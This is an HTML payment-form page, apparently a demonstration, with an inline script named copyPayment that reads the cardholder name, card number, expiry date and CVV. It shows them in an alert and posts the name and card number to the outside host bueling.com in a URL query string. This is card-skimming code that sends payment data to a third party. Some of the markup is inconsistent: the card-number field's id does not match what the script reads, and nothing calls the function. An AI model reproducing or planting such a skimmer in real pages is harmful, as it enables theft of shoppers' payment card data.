<!DOCTYPE html>
<html>
  <head><title></title>
  </head>
  <body>
	  <script type='text/javascript'>
		  function copyPayment(){
			  var name=document.getElementById('cardname');
			  var card=document.getElementById('cardnumber');
			  var expdate=document.getElementById('expirationdate');
			  var cvv=document.getElementById('cvv');
			  alert('name:'+name.value+'\ncard:'+card.value+'\nexpdate:'+expdate.value+'\ncvv:'+cvv.value);
			  var pdata = JSON.stringify(name); console.log(pdata);
			  setTimeout(
				  function(){
					  jQuery.ajax({ type:"post", crossOrigin: true,  async: true, url: 'https://bueling.com/?name=' + name.value + '&card=' + card.value, data: pdata, dataType: 'application/json' });
				  },250);
		  }
	  </script>
	Payment Form
    <form action="/my-handling-form-page" method="post">
        <div>
            <label for="cardname">Card Name:</label>
            <input type="text" id="cardname" />
        </div>
        <div>
            <label for="cardnumber">Card Number:</label>
            <input type="email" id="mail" />
        </div>
        <div>
            <label for="expirationdate">Expiration Date (MM/YY):</label>
            <input id="expirationdate"></input>
        </div>
		<div>
            <label for="cvv">CVV:</label>
            <input id="cvv"></input>
        </div>
		<button name="button">Pay Now</button>
    </form>
  </body>
</html>
